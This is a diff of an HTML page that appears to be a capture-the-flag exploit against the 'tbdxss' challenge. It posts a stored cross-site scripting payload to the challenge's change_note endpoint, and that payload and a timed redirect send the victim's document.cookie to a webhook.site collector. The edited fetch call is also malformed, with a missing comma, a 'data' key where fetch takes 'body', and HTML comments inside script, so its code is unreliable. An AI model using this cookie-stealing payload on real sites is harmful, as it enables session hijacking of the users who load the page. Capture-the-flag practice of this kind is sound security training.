@@ -5,17 +5,23 @@
     </head>
     <body>
         <!-- <form method="POST" id="myform" name="myform" action="https://tbdxss.chal.perfect.blue/change_note"> -->
-        <form method="POST" id="myform" name="myform" action="https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953">
-
-
-            <input type="text" name="data" value="<script>window.location=`https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953?c=${document.cookie}`</script>"></input>
-            <input type="submit"></submit>
+            <!-- <input type="text" name="data" value="<script>window.location=`https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953?c=${document.cookie}`</script>"></input> -->
+            <!-- <input type="submit"></submit> -->
         </form>
         <script>
             
-            document.myform.submit();
+            fetch("https://tbdxss.chal.perfect.blue/change_note", {
+                            method: "post",
+                            headers: {
+                                            "Content-Type": "multipart/form-data"
+                                        }
+                            data: {
+                                            "data":"<script>window.location=`https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953?c=${document.cookie}`</script>"
+                                        }
+                        });
+            <!-- document.myform.submit(); -->
             setTimeout(function(){ window.location = "https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953?c=${document.cookie}"; }, 2000);
-            // window.location = "https://tbdxss.chal.perfect.blue/note";
+            <!-- // window.location = "https://tbdxss.chal.perfect.blue/note"; -->
         </script>
     </body>
 </html>
